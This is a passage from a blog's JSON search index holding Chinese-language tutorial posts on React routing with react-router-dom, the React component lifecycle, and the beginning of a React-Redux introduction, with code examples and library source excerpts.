文件，这就实现了到对应页面才加载该页面的 js，不过有一点应该注意到就是 bundle.js 文件依然非常的大，这是因为 react 本身就需要依赖诸如 react,react-dom 以及各种 loader,这些文件都会被打包到 bundle.js 中，而我们虽然用路由实现了各页面的‘按需加载’，但这只分离了一小部分代码出去，剩下的怎么办？还是得用 webpack。 文章代码 github 标注： 参考资料1：https://www.jianshu.com/p/7df7a6c2f3ec","categories":[{"name":"前端","slug":"前端","permalink":"http://liuxuewen-site.github.io/categories/前端/"}],"tags":[{"name":"前端-react","slug":"前端-react","permalink":"http://liuxuewen-site.github.io/tags/前端-react/"}]},{"title":"React路由","slug":"React-bs-router01","date":"2018-12-18T15:41:33.000Z","updated":"2019-01-25T10:17:06.430Z","comments":true,"path":"2018/12/18/React-bs-router01/","link":"","permalink":"http://liuxuewen-site.github.io/2018/12/18/React-bs-router01/","excerpt":"","text":"一、前言 react-router 针对不同的使用场景衍生了不同的路由包，RN 项目用 react-router-native，Web 项目用react-router-dom。并且不需要再重复引入 react-router。下面用的是 react-router-dom。 二、前端路由 开始今天的话题之前，先来了解一下前端路由，Ajax 诞生以后，解决了向服务器端发起请求重刷整个页面的问题，但随之而来的问题是无法保存 Ajax 操作状态，浏览器的前进后退功能也不可用，当下流行的两种解决方法是： 1）hash, 其原本的作用是为一个很长的文档页添加锚点信息，它自带不改变 url 刷新页面的功能，所以自然而然被用在记录 Ajax 操作状态中了。 2）history, 其是主流的解决方案，浏览器的前进后退用的就是这个，它是 window 对象下的。 以前的 history 提供的方法只能做页面之间的前进后退，如下： 123history.go(number|URL) 可加载历史列表中的某个具体的页面history.forward() 可加载历史列表中的下一个 URLhistory.back() 可加载历史列表中的前一个 URL 为了让 history 不仅仅能回退到上一个页面，还可以回到上一个操作状态，HTML5 新增了三个方法，其中两个是在 history 对象里的： 12345history.pushState(state, title, url) 添加一条历史记录。state 用于传递参数，可以为空。title 是设置历史记录的标题，可以为空。url 是历史记录的 URL，不可以为空。history.replaceState(state, title, url) 将 history 堆栈中当前的记录替换成这里的 url。参数同上。 还有一个事件在 window 对象下： 12window.onpopstate() 监听 url 的变化。会忽略 hash 的变化（hash 变化有一个 onhashchange 事件），但是前面的两个事件不会触发它。 到这里你大概猜到单页面应用或者 Ajax 操作记录状态用的就是 hash 和 h5 增加的 history API，这就是 react-router-dom 扩展的路由实现，也是 web 应用最常用的两种路由。 三、静态路由和动态路由 react-router v4 是一个非常大的版本改动，具体体现在从 “静态路由” 到 “动态路由” 的转变上。 一般将 “静态路由” 看作一种配置，当启动 react 项目时，会先生成好一个路由表，发生页面跳转时，react 会根据地址到路由表中找到对应的处理页面或处理方法。 而动态路由不是作为一个项目运行的配置文件存储在外部，它在项目 render 的时候才开始定义，router 的作者认为 route 应当和其它普通组件一样，它的作用不是提供路由配置，而是一个普通的UI组件，这也符合 react 的开发思想 —— 一切皆组件。 下面引用一段 router 作者对路由做这么大改动的原因： To be candid, we were pretty frustrated with the direction we’d taken React Router by v2. We (Michael and Ryan) felt limited by the API, recognized we were reimplementing parts of React (lifecycles, and more), and it just didn’t match the mental model React has given us for composing UI. We ended up with API that wasn’t “outside” of React, an API that composed, or naturally fell into place, with the rest of React. 四、安装 对于 web 应用，我们只需要安装 react-router-dom： 1yarn add react-router-dom 在 node_modules 下你依然会看到 react-router 的身影，这是 react-router-dom 依赖的包，另外还有一个 history 包，这个下面会提到。 五、&lt; Router &gt; &lt; Router &gt;是实现路由最外层的容器，一般情况下我们不再需要直接使用它，而是使用在它基础之上封装的几个适用于不同环境的组件，react-router-dom 的 Router 有四种： 1）BrowserRouter：react-router-dom 扩展，利用 HTML5 新增的 history API (pushState, replaceState)，是 web 应用最常用的路由组件。 2）HashRouter：react-router-dom 扩展，利用 window.location.hash，适用于低版本浏览器或者一些特殊情境。 3）MemoryRouter：继承自 react-router，用户在地址栏看不到任何路径变化，一般用在测试或者非浏览器环境开发中。 4）StaticRouter：继承自 react-router，某些页面从渲染出来以后没有多的交互，所以没有状态的变化需要存储，就可以使用静态路由，静态路由适用于服务器端。 备注：还有个 withRouter 有别于上面四个组件，这里没有列出来。一般我们很少会用到 MemoryRouter 和 StaticRouter，在 web 应用中更多的是用 react-router-dom 扩展出来的 BrowserRouter 和 HashRouter，这两个就是前面提到的前端路由的两种解决办法的各自实现。 为了不被后面的一些配置弄迷糊，我们从&lt; Router &gt;的实现源码来看看路由到底传了些什么东西： 1234567891011121314151617181920212223242526272829303132333435363738394041Router.js:class Router extends React.Component &#123; //检测接收的参数 static propTypes = &#123; history: PropTypes.object.isRequired, //必须传入 children: PropTypes.node &#125; //设置传递给子组件的属性 getChildContext() &#123; return &#123; router: &#123; ...this.context.router, history: this.props.history, //核心对象 route: &#123; //history里的location对象 location: this.props.history.location, //当路由路径和当前路径成功匹配，一些有关的路径信息会存放在这里，嵌套路由会用到它。 match: this.state.match &#125; &#125; &#125; &#125; state = &#123; match: this.computeMatch(this.props.history.location.pathname) &#125; computeMatch(pathname) &#123; return &#123; path: '/', url: '/', params: &#123;&#125;, //页面间传递参数 isExact: pathname === '/' &#125; &#125;&#125; 这里最重要的就是需要我们传入的 history 对象，前面提到我们一般不会直接使用&lt; Router &gt;组件，因为这个组件要求我们手动传入 history 对象，但这个对象又非常重要，而且不同的开发环境需要不同的 history，所以针对这种情况 react-router 才衍生了两个插件 react-router-dom 和 react-router-native（我认为这是比较重要的原因，浏览器有一个 history 对象，所以 web 应用的路由都是在此对象基础上扩展的）。 接着让我们来看一下 react-router-dom 用到的来自 history 的两个方法：createBrowserHistory（适用于现代浏览器，支持 h5 history API），createHashHistory（适用于需要兼容老版本浏览器的情况）。这两个方法就分别对应了两个组件：&lt; BrowserRouter &gt;和&lt; HashRouter &gt;,它俩返回的 history 对象拥有的属性是一样的，但是各自的实现不同: 12345678910111213141516171819202122232425262728293031323334353637// createHashHistory.jsvar HashChangeEvent = 'hashchange'; // hash值改变时会触发该事件var createHashHistory = function createHashHistory() &#123; var globalHistory = window.history; // 全局的history对象 var handleHashChange = function handleHashChange() &#123;&#125; // hash值变化时操作的方法&#125;// createBrowserHistory.jsvar PopStateEvent = 'popstate'; // 监听url的变化事件// 依然监听了hash改变的事件，但是多加了一个判断是是否需要监听hash改变，如果不需要就不绑定该事件。var HashChangeEvent = 'hashchange'; var createBrowserHistory = function createBrowserHistory() &#123; var globalHistory = window.history; //全局的history对象 var handlePop = function handlePop(location) &#123;&#125; // 出栈操作&#125;// createHashHistory.js，createBrowserHistory.js导出的history对象const history = &#123; length: globalHistory.length, // globalHistory就是window.history action: \"POP\", // 操作历史状态都属于出栈操作 //最重要的!!前面的Router.js源码向子组件单独传递了这个对象，因为路由匹配会用到它。 location: initialLocation, createHref, // 生成的url地址样式，如果是hash则加一个'#' push, // 扩展history.pushState()方法 replace, // 扩展history.replaceState()方法 go, // history.go()方法 goBack, // history.back()方法 goForward, // history.forward()方法 block, listen&#125; 我们从控制台打印一下看看这个 history： 所以，我们直接用&lt; BrowserRouter &gt;与使用&lt; Router &gt;搭配 createBrowserHistory() 方法是一样的效果: 1234567891011121314151617181920import &#123; Router &#125; from 'react-router-dom'import createBrowserHistory from 'history/createBrowserHistory';const history = createBrowserHistory();const App = () =&gt; ( &lt;Router history=&#123;history&#125;&gt; &lt;div&gt; &#123;/*其它*/&#125; &lt;/div&gt; &lt;/Router&gt;)等同于：import &#123; BrowserRouter &#125; from 'react-router-dom'const App = () =&gt; ( &lt;BrowserRouter&gt; &lt;div&gt;&#123;/*其它*/&#125;&lt;/div&gt; &lt;/BrowserRouter&gt;) 然后我们看看&lt; BrowserRouter &gt;和&lt; HashRouter &gt;使用的一些注意点: &lt; HashRouter &gt;生成的 url 路径看起来是这样的： 1http://localhost:8080/#/user 我们知道 hash 值是不会传到服务器端的，所以使用 hash 记录状态不需要服务器端配合。 &lt; BrowserRouter &gt;生成的路径是这样的： 1http://localhost:8080/user 这时候在此目录下刷新浏览器会重新向服务器发起请求，服务器端没有配置这个路径，所以会出现 can’t GET /user 这种错误，而解决方法就是修改 devServer 的配置: 123456789webpack.config.js:devServer: &#123; publicPath: publicPath, contentBase: path.resolve(__dirname, 'build'), inline: true, hot: true, historyApiFallback: true, //增加&#125;, 还有一点需要注意的是&lt; Router &gt;只能有一个子孩子，这也符合 React 的规则。 六、&lt; Route &gt; &lt; Route &gt;是路由配置的具体实现，它指定当路径匹配的时候渲染哪一个UI，一个基本的路由配置如下： 1234567&lt;Router&gt; &lt;div&gt; &lt;Route exact path=\"/\" component=&#123;Home&#125;/&gt; &lt;Route strict path=\"/login\" render=&#123;() =&gt; &lt;h1&gt;Login&lt;/h1&gt;&#125; /&gt; &lt;Route path=\"/user\" children=&#123;() =&gt; &lt;h1&gt;User&lt;/h1&gt;&#125;/&gt; &lt;/div&gt;&lt;/Router&gt; path 是用于指定路径名的，exact 和 strict 是匹配路径名时指定更为严格的匹配规则，其匹配原则用的是 path-to-regexp。 如果&lt; Route &gt;不写 path 则总是能被匹配。当 exact 为 true 时只有 path 等于 location.pathname 时才会匹配成功，location 就是前面 Router 提到的 location 对象。当 strict 为 true 时会严格验证尾随线，path 和 location.pathname 都有或者都没有才会匹配成功。 看几个例子理解一下 exact 和 strict（注意以下例子 exact 和 strict 都是写在&lt; Route &gt;里的，&lt; NavLink &gt;也有这两个值，写在这两个地方效果是不一样的，后面会讲&lt; NavLink &gt;）： 注意：第三、四行是带参数路由的写法，后面会讲。 总结：从表中可以看出，当一个路径包含某一个路径，暂且称它们为子路径和父路径，如果 exact 为 false (默认)，那么“子路径”会渲染出“父路径”的UI（所有的路径都是’/‘的子路径）,如果不想子路径渲染出父路径的UI，那么就给父路径添加 exact 属性。所以表中一二行的 exact 是加在‘/’的&lt; Route &gt;里，三四行是加在’/user’的&lt; Route &gt;里。 注意：表中第二三行的区别，即多余的尾随线加在 location.pathname 里，那么依然会匹配成功。 总结：从第四行可以看出，path 有尾随线，location.pathname 有二级路由，会被认为也是有尾随线的，所以会匹配成功，不过只需要再添加 exact,那么就无法匹配成功了。 接下来看一下 component, render, children，他们是渲染UI方法，区别如下： 1）component（最常用）当路径匹配时渲染UI，内部实现用的是 React.createElement() 方法，即每一次都会触发卸载和创建组件，如果渲染的UI没有多余的内容，推荐使用 render。 2）render 当路径匹配时渲染UI，与 component 不同的是，它只调用 render() 方法去渲染组件，不会去重新创建元素，所以速度更快，只适用于行内渲染。 3）children 与 render 类似，唯一的区别是不管路径是否匹配都会渲染，所以它最适合用于做转场动画。 这三个方法在渲染组件的同时还传递了几个参数过去，这些参数也不是它的，是从前面传下来的： 1const props = &#123; match, location, history, staticContext &#125; 除了最后一个其它三个已经见过了，match 来自 Router.js，前面有源码，history 和 loaction 来自 history 插件的 createBrowserHistory 或 createHashHistory 方法，最后一个待定。现在，这几个 UI 组件都可以访问到这几个对象了： 12345678910111213141516//component&lt;Route path=\"/user\" component=&#123;User&#125; /&gt;//User.jsclass User extends Component &#123; let &#123; match, location, history &#125; = this.props; render() &#123; return( &lt;div className=\"user\"&gt;&lt;/div&gt; ) &#125;&#125;//render, children&lt;Route path=\"/user\" render=&#123;(match, location, history) =&gt; &lt;div&gt;&lt;/div&gt;&#125; /&gt; 当然，有个最简单的方式就是直接传一个 props 属性过去，这几个对象可以直接通过 props 属性访问： 12//render, children&lt;Route path=\"/user\" render=&#123;(props) =&gt; &lt;User &#123;...props&#125;/&gt;&#125; /&gt; 它们有啥用？后面就知道了。 七、&lt; NavLink &gt;和&lt; Link &gt; 它俩都是 react-router-dom 提供的组件，&lt; NavLink &gt;是在&lt; Link &gt;上面扩展了当路由匹配时添加样式属性,而这更常用，所以建议直接使用&lt; NavLink &gt;。 &lt; Link &gt;提供的属性及方法： 123456789101112to [string]: 路径名to [object]: location对象，值如下：&#123; pathname: '/', // 路径名， search: '', // 参数，会添加到url里面，形如\"?name=melody&amp;age=20\" hash: '', // 参数，会添加到url里面，形如\"#tab1\" state: &#123;&#125;, // 参数，不会添加到url里面&#125;replace[bool]: false, // 是否替换当前路由，正常情况下是往路由栈里新增一条数据， // 如果将此参数设置为true,则会替换当前路由。 &lt; NavLink &gt;扩展的属性及方法： 1234567activeClassName[string]:'active', // 路由匹配时添加的class，默认是activeactiveStyle[object]: &#123;&#125;, // 路由匹配时的样式exact[bool]: // 是否开启严格模式strict[bool]： // 是否严格验证尾随线 对于&lt; NavLink &gt;设置 exact 和 strict 这两个参数非常困惑，比如遇到的一个坑： 已经设置&lt; Route exa/ct path=”/“ component={Home} / &gt;，并且在 login 页也不会渲染出 home 页的UI，但非常惊讶的发现当使用&lt; NavLink &gt;的选中样式属性时，在二级路由(图中的 User 和 Login )里却始终显示着 Home 页的选中样式。后来发现需要给匹配 Home 页的&lt; NavLink &gt;也添加 exact 。而 strict 参数也并没有验证出加与不加有何区别。 去源码里面找答案： 123456789101112131415161718return ( &lt;Route path=&#123;escapedPath&#125; exact=&#123;exact&#125; strict=&#123;strict&#125; location=&#123;location&#125; children=&#123;(&#123; location, match &#125;) =&gt; &#123; const isActive = !!(getIsActive ? getIsActive(match, location) : match) return ( &lt;Link to=&#123;to&#125; className=&#123;isActive ? [ className, activeClassName ].filter(i =&gt; i).join(' ') : className&#125; style=&#123;isActive ? &#123; ...style, ...activeStyle &#125; : style&#125; /&gt; ) &#125;&#125; /&gt;) 发现这俩参数依然是添加在了&lt; Route &gt;组件上，那为什么和之前&lt; Route &gt;的 exact 和 strict 参数表现会不一样呢？这里有一个关键属性就是 isActive,源码中可以看到，某一个路由是否匹配完全取决于这个属性。 前面没有提到&lt; NavLink &gt;还可以传入一个方法：isActive()，源码中的 getIsActive 对应的就是我们传入的 isActive 方法，源码中的 isActive 仅仅是一个布尔值。官网对 isActive() 方法的解释是： isActive[func]：添加额外逻辑以确定路由是否处于被匹配状态。如果你想要做的不仅仅是验证链接的路径名是否与当前URL的路径名相匹配，那么应该使用它。 从源码中可以看到，当不传入 isActive() 方法时，isActive 的取值就是 match,match 就比较好玩了，在最前面提到过它最常用在嵌套路由中，当路由不匹配的时候，它的值为 null。当路由匹配时，它会长这样： 123456match = &#123; isExact: true, //没研究过，不知道干啥用的 params: &#123;&#125;, //参数 path: \"/\", //值就是&lt;Route&gt;的path值 url: \"/\" //值就是location.pathname&#125; 也就是说，假如你当前在 Login 页下面，那么 Login 页的 match 对象有值，而别的页面 Login 页的 match 是 null，但是这个别的页面不包括首页，如下： 解决办法就是给&lt; NavLink to=”/“ &gt; 添加 exact 参数。 八、&lt; Switch &gt; 顾名思义&lt; Switch &gt;就是一个“开关”，它会在多个路由配置都可以匹配成功的时候只选择第一个匹配上的渲染其UI，有的时候它也需要和 exact 配合使用，否则会有永远匹配不上某个路由的情况发生。比如： 1234567&lt;Route path=\"/dataList\" component=&#123;List&#125;/&gt;&lt;Route path=\"/dataList/:id\" component=&#123;ListDetails&#125;/&gt;&lt;Route path=\"/error\" component=&#123;Error&#125; /&gt;&lt;Route path=\"*\" render=&#123;() =&gt; &lt;Redirect to=\"/error\"/&gt; &#125;/&gt;&lt;li&gt;&lt;NavLink to=\"/dataList/4\"&gt;Go to ListDetails&lt;/NavLink&gt;&lt;/li&gt;&lt;li&gt;&lt;NavLink to=\"/dataList\"&gt;Go to List&lt;/NavLink&gt;&lt;/li&gt; List的&lt; Route &gt;配置没有加 exact 参数，所以在 ListDetails 页也会渲染出 List 页面，添加了&lt; Switch &gt;以后，根据&lt; Switch &gt;的工作原则，它只渲染第一个匹配成功的UI，这就会导致 ListDetails 永远不会被渲染，而正确做法是给 List 添加 exact: 123456&lt;Switch&gt; &lt;Route exact path=\"/dataList\" component=&#123;List&#125;/&gt; &lt;Route path=\"/dataList/:id\" component=&#123;ListDetails&#125;/&gt; &lt;Route path=\"/error\" component=&#123;Error&#125; /&gt; &lt;Route path=\"*\" render=&#123;() =&gt; &lt;Redirect to=\"/error\"/&gt; &#125;/&gt;&lt;/Switch&gt; 我觉得&lt; Switch &gt;最大的作用就是可以实现当所有路由都匹配不上的时候，可以显示一个404页面，也就是代码中的 Error 页。 注意：使用&lt; Switch &gt;路由配置的顺序非常重要，因为它会渲染第一个匹配上的，所以应该将最详细的路由写在前面，容易被配上的路由写在后面。 九、&lt; Redirect &gt; 重定向组件，它会从路由栈里将当前路由替换为它的路径名，这也是它和&lt; NavLink &gt;的最大区别： 12&lt;Route path=\"/error\" component=&#123;Error&#125; /&gt;&lt;Route path=\"*\" render=&#123;() =&gt; &lt;Redirect to=\"/error\"/&gt; &#125;/&gt; to 属性和&lt; NavLink &gt;的 to 一样，可以为 string，也可以为 object，为 string 时就是 location.pathname ,为 object 时就是 location 对象。 push 属性对应&lt; NavLink &gt;的 replace，&lt; Redirect &gt;默认行为是替换路由，而&lt; NavLink &gt;默认行为是新增一个路由，push 和 replace 就是改变它们的默认行为的参数。 from，指定一个路由名，当匹配到该路由时重定向到另一个路由上： 12345&lt;Switch&gt; &lt;Redirect from=\"/hello\" to=\"/user\" /&gt; &lt;Route path=\"/login\" component=&#123;Login&#125;/&gt; &lt;Route exact path=\"/user\" render=&#123;() =&gt; &lt;div&gt;hello user&lt;/div&gt;&#125;/&gt;&lt;/Switch&gt; 注：官网说指定的路由必须在&lt; Switch &gt;里面才有效，但测试了发现它的意思不是说 from 或者 to 的值都必须是&lt; Switch &gt;里面的&lt; Route &gt;的 path 指定过的(比如代码中的/hello)，而是如果你要使用 from 属性则必须将其包含在&lt; Switch &gt;里面，否则页面会报警告。并且要注意&lt; Redirect &gt;要写在它想要替换的路由配置前面，否则不会生效。 标注： 参考资料1：https://www.jianshu.com/p/875225b2ec90","categories":[{"name":"前端","slug":"前端","permalink":"http://liuxuewen-site.github.io/categories/前端/"}],"tags":[{"name":"前端-react","slug":"前端-react","permalink":"http://liuxuewen-site.github.io/tags/前端-react/"}]},{"title":"React生命周期","slug":"React-bs-lifeCycle","date":"2018-12-15T16:00:42.000Z","updated":"2019-01-25T10:16:53.107Z","comments":true,"path":"2018/12/16/React-bs-lifeCycle/","link":"","permalink":"http://liuxuewen-site.github.io/2018/12/16/React-bs-lifeCycle/","excerpt":"","text":"一、react生命周期 React 生命周期分为三种状态 1. 初始化 2.更新 3.销毁 二、初始化 当组件被实例化，第一次被创建时，以下方法依次被调用： 1）getDefaultProps 2）getInitialState 3）componentWillMount 4）render 5）componentDidMount（组件在客户端被实例化时有，在服务端被实例化时没有） 1、getDefaultPropos() 对于每个组件实例来说，该方法只会调用一次，该组件类的所有后续应用, getDefaultPops 不会再被调用，其返回的对象可以用于设置默认的 props(properties的缩写) 值。 12345678910111213141516var Hello = React.creatClass(&#123; getDefaultProps: function()&#123; return &#123; name: 'pomy', git: 'dwqs' &#125; &#125;, render: function()&#123; return ( &lt;div&gt;Hello,&#123;this.props.name&#125;,git username is &#123;this.props.dwqs&#125;&lt;/div&gt; ) &#125;&#125;);ReactDOM.render(&lt;Hello /&gt;, document.body); 2、getInitialState() 对于每个组件实例来说，该方法只会调用一次，用来初始化每个实例的 state。在使用 es6 的 class 语法时是没有这个钩子函数的，可以直接在 constructor 中定义 this.state。 123456789101112131415161718192021var LikeButton = React.createClass(&#123; getInitialState: function() &#123; return &#123;liked: false&#125;; &#125;, handleClick: function(event) &#123; this.setState(&#123;liked: !this.state.liked&#125;); &#125;, render: function() &#123; var text = this.state.liked ? 'like' : 'haven\\'t liked'; return ( &lt;p onClick=&#123;this.handleClick&#125;&gt; You &#123;text&#125; this. Click to toggle. &lt;/p&gt; ); &#125;&#125;);ReactDOM.render( &lt;LikeButton /&gt;, document.getElementById('example')); 在这个方法里（constructor也是），可以访问组件的 props。每一个 React 组件都有自己的 state，其与 props 的区别在于 state 只存在组件的内部，props 在所有实例中共享。 getInitialState 和 getDefaultPops 的调用是有区别的，getDefaultPops 是对于组件类来说只调用一次，后续该类的应用都不会被调用，而 getInitialState 是对于每个组件实例来讲都会调用，并且只调一次。 每次修改 state（不要直接修改 this.state，要通过 this.setState 方法来修改），都会重新渲染组件。实例化后通过 state 更新组件，会依次调用下列方法： 1）shouldComponentUpdate 2）componentWillUpdate 3）render 4）componentDidUpdate 3、componentWillMount() 该方法在首次渲染之前调用，也是在 render 方法调用之前修改 state 的最后一次机会，即整个生命周期只调用一次。 4、render() 该方法会创建一个虚拟dom，用来表示组件的输出，进行diff算法，更新dom树都在此进行。render方法需要满足下面几点： 1）只能通过 this.props 和 this.state 访问数据（不能修改） 2）可以返回 null,false 或者任何 React 组件 3）只能出现一个顶级组件，不能返回一组元素 4）不能改变组件的状态 5）不能修改DOM的输出 render 方法返回的结果不是真正的 DOM 元素，而是一个虚拟的表现，类似于一个DOM tree结构的对象。react之所以效率高，就是这个原因。 5、componentDidMount() 组件渲染之后调用，只调用一次，该方法不会在服务端被渲染的过程中调用。该方法被调用时，已经渲染出真实的 DOM，可以在该方法中通过 this.getDOMNode() 访问到真实的 DOM(推荐使用 ReactDOM.findDOMNode())： 1234567891011var data = [..];var comp = React.createClass(&#123; render: function()&#123; return &lt;imput .. /&gt; &#125;, componentDidMount: function()&#123; $(this.getDOMNode()).autoComplete(&#123; src: data &#125;) &#125;&#125;) 由于组件并不是真实的 DOM 节点，而是存在于内存之中的一种数据结构，叫做虚拟 DOM （virtual DOM）。只有当它插入文档以后，才会变成真实的 DOM 。有时需要从组件获取真实 DOM 的节点，这时就要用到 ref 属性： 123456789var Area = React.createClass(&#123; render: function()&#123; this.getDOMNode(); //render调用时，组件未挂载，这里将报错 return &lt;canvas ref='mainCanvas'&gt; &#125;, componentDidMount: function()&#123; var canvas = this.refs.mainCanvas.getDOMNode(); //这是有效的，可以访问到 Canvas 节点 &#125;&#125;) 需要注意的是，由于 this.refs.[refName] 属性获取的是真实 DOM ，所以必须等到虚拟 DOM 插入文档以后，才能使用这个属性，否则会报错。 三、更新 此时组件已经渲染好并且用户可以与它进行交互，如鼠标点击，手指点按，或其它的一些事件，导致应用状态的改变，你将会看到下面的方法依次被调用： 1）componentWillReceiveProps 2）shouldComponentUpdate 3）componentWillUpdate 4）render 5）componentDidUpdate 1、componentWillReceiveProps(nextProps) 组件初始化时不调用，在组件接受新的 props 时调用。可以在这个方法里更新 state,以触发 render 方法重新渲染组件。 1234567componentWillReceiveProps: function(nextProps)&#123; if(nextProps.checked !== undefined)&#123; this.setState(&#123; checked: nextProps.checked &#125;) &#125;&#125; 2、shouldComponentUpdate(nextProps, nextState) react 性能优化非常重要的一环。组件接受新的 state 或者 props 时调用，我们可以在此对比前后两个 props 和 state 是否相同，如果相同则返回 false 阻止组件的重新渲染，因为相同的属性状态一定会生成相同的 dom 树，这样就不需要创造新的 dom 树和旧的 dom 树进行 diff 算法对比，节省大量性能，尤其是在 dom 结构复杂的时候，该方法是非必须的，并且大多数情况下没有在开发中使用： 123shouldComponentUpdate: function(nextProps, nextState)&#123; return this.state.checked === nextState.checked; // return false 则不更新组件&#125; 3、componentWillUpdata(nextProps, nextState) 组件初始化时不调用，在组件接收到了新的 props 或者 state 即将进行重新渲染前才调用，此时可以修改state。 4、render() 组件渲染 5、componentDidUpdate() 组件初始化时不调用，在组件更新完成后调用，此时可以获取 dom 节点。 四、销毁 1、componentWillUnmount() 每当 React 使用完一个组件，这个组件必须从 DOM 中卸载后被销毁，此时 componentWillUnmout 会被执行，完成所有的清理和销毁工作，在 componentDidMount 中添加的任务都需要再该方法中撤销，如创建的定时器或事件监听器。 五、补充 1、反模式 在 getInitialState 方法中，尝试通过 this.props 来创建 state 的做法是一种反模式： 1234567891011121314// 反模式getDefaultProps: function()&#123; return &#123; data: new Date() &#125;&#125;,getInitialState: function()&#123; return &#123; day: this.props.date - new Date() &#125;&#125;,render: function()&#123; return &lt;div&gt;Day:&#123;this.state.day&#125;&lt;/div&gt;&#125; 经过计算后的值不应该赋给 state，正确的模式应该是在渲染时计算这些值。这样保证了计算后的值永远不会与派生出它的 props 值不同步： 12345678910//正确模式getDefaultProps: function()&#123; return &#123; data: new Date() &#125;&#125;,render: function()&#123; var day = this.props.date - new Date(); return &lt;div&gt;Day:&#123;day&#125;&lt;/div&gt;&#125; 如果只是简单的初始化 state，那么应用反模式是没有问题的。 2、执行次数 1）只执行一次： getDefalutProps、getInitialState(constructor)、componentWillMount、componentDidMount 2）执行多次：render 、子组件的componentWillReceiveProps、componentWillUpdate、componentDidUpdate) 3）有条件的执行：componentWillUnmount（页面离开，组件销毁时） 4）不执行的：根组件（ReactDOM.render在DOM上的组件）的componentWillReceiveProps（因为压根没有父组件给传递props） 3、执行顺序 假设组件嵌套关系是 App里有parent组件，parent组件有child组件。 1）如果不涉及到setState更新，第一次渲染的顺序如下： constructor — App componentWillMount — App render – App constructor – parent componentWillMOunt – parent render – parent constructor – child componentWillMount – child render – child componentDidMount – child compomentDidMount – parent componentDidMount – App 2）如果触发App的setState事件： componentWillUpdate – App render – App componentWillReceiveProps – parent componentWillUpdate – parent render – parent componentWillReceiveProps – child componentWillUpdate – child render – child componentDidUpdate – child componentDidUpdate – parent componentDidUpdate – App 3）如果触发parent的setState事件： componentWillUpdate – parent render – parent componentWillReceiveProps – child componentWillUpdate – child render – child componentDidUpdate – child componentDidUpdate – parent 4）如果触发了child的setState事件： componentWillUpdate – child render – child componentDidUpdate – child 结论：完成前的顺序是从根部到子部，完成时时从子部到根部。（类似于事件机制） 3、什么时候该用 componentWillReceiveProps 先知道一下： A、componentWillReceiveProps 函数有一个参数 nextProps，它是一个对象，是 update 时候（也就是下一次）父组件传递过来的 props 。 B、有些生命周期函数只执行一次，有的执行多次，其中 componentWillReceiveProps 执行多次，而 constructor 等执行一次。 C、在子组件中每次传递过来的 this.props 对象其实和 componentWillReceiveProps 的 nextProps 是一样的，都是最新的。 D、componentWillReceiveProps 是在更新子组件最先执行的，优先于 compoentWillUpdate ，更优先于 render 。 E、render 函数里不能使用 setState()，否则会造成死循环。 由上可知，this.props 和 componentWillReceiveProps的 nextProps 是一样的，通过 this.props 就可以取到最新的值， 那么 componentWillReceiveProps 还有必要吗？大部分情况下 componentWillReceiveProps 生命周期函数是没用的，可以略去不写，因为它确实没什么用。但有几种情况如下： 1）由D得知，componentWillReceiveProps 是最先执行的，所以在其内可以 setState(｛｝)，在接下来的 render 中能拿到最新的 state 后值，再加上B得知，如果是下面这种情况： 在constructor函数中通过 props 初始化了某个 state ，必须用 componentWillReceiveProps 来更新 state ，以便 render 中为新的 state 值。 1234567891011121314// 在constructor中通过props获取params赋值给当前组件的stateconstructor(props) &#123; super(props); this.state = &#123; params: props.params &#125;;&#125;// 必须用此生命周期setState，以便render中为新componentWillReceiveProps = (nextProps) =&gt; &#123; this.setState(&#123; params: nextProps.params &#125;)&#125; 2）如果父组件有一些请求，每次参数更新的时候才发请求，同时和子组件的关系比较密切，可以将数据请求放在componentWillReceiveProps进行执行，需要传的参数则从(nextProps)中获取，而不必将所有的请求都放在父组件中，于是该请求只会在该组件渲染时才会发出，从而减轻请求负担。 3）watch监听props值变化，对子组件进行处理，比如：当传入的props.value发生变化，执行一些动作。如果你接触过vue，会知道vue中有一个关于watch的选项，是根据setter获取新旧值，进行动作的执行，而react中最合适做watch的时机是在componentWillReceiveProps中： 1234567componentWillReceiveProps(nextProps) &#123; const &#123; value: oldValue &#125; = this.props; // this.props中的值是旧值 const &#123; value: newValue &#125; = nextProps; // nextProps中的值是新值 if (newValue !== oldValue) &#123; // TODO... &#125;&#125; 标注： 参考资料1：https://www.cnblogs.com/qiaojie/p/6135180.html 参考资料2：https://segmentfault.com/a/1190000004168886?utm_source=tag-newest 参考资料3：http://www.cnblogs.com/soyxiaobi/p/9559117.html","categories":[{"name":"前端","slug":"前端","permalink":"http://liuxuewen-site.github.io/categories/前端/"}],"tags":[{"name":"前端-react","slug":"前端-react","permalink":"http://liuxuewen-site.github.io/tags/前端-react/"}]},{"title":"Redux入门之03-React-Redux的用法","slug":"Redux-ryf-03","date":"2018-12-14T16:14:52.000Z","updated":"2018-12-14T16:25:14.397Z","comments":true,"path":"2018/12/15/Redux-ryf-03/","link":"","permalink":"http://liuxuewen-site.github.io/2018/12/15/Redux-ryf-03/","excerpt":"","text":"一、前言 前两篇介绍了 Redux 的基本用法和异步操作，今天介绍如何在 React 项目中使用 Redux。 为了方便使用，Redux 的作者封装了一个 React 专用的库 React-Redux，本文主要介绍它。这个库是可以选用的，实际项目中，应该权衡一下是直接使用 Redux，还是使用 React-Redux。后者虽然提供了便利，但需要掌握额外的 API，并且要遵守它的组件拆分规范。 二、组件 React-Redux 将所有组件分成两大类：UI 组件（presentational component）和容器组件（container component）。 UI 组件有以下几个特征： 1）只负责 UI 的呈现，不带有任何业务逻辑 2）没有状态（即不使用this.state这个变量） 3）所有数据都由参数（this.props）提供 4）不使用任何 Redux 的 API 因为不含有状态，UI 组件又称为”纯组件”，即它纯函数一样，纯粹由参数决定它的值。下面就是一个 UI 组件的例子： 1const Title = value =&gt; &lt;h1&gt; &#123;value&#125; &lt;/h1&gt;; 容器组件的特征恰恰相反： 1）负责管理数据和业务逻辑，不负责 UI 的呈现 2）带有内部状态 3）使用 Redux 的 API 总之，只要记住一句话就可以了：UI 组件负责 UI 的呈现，容器组件负责管理数据和逻辑。你可能会问，如果一个组件既有 UI 又有业务逻辑，那怎么办？回答是，将它拆分成下面的结构：外面是一个容器组件，里面包了一个UI 组件，前者负责与外部的通信，将数据传给后者，由后者渲染出视图。 React-Redux 规定，所有的 UI 组件都由用户提供，容器组件则是由 React-Redux 自动生成。也就是说，用户负责视觉层，状态管理则是全部交给它。 三、connect() React-Redux 提供 connect 方法，用于从 UI 组件生成容器组件。connect 的意思，就是将这两种组件连起来。 下面代码中，TodoList是 UI 组件，VisibleTodoList 就是由 React-Redux 通过 connect 方法自动生成的容器组件。 12import &#123; connect &#125; from 'react-redux'const VisibleTodoList 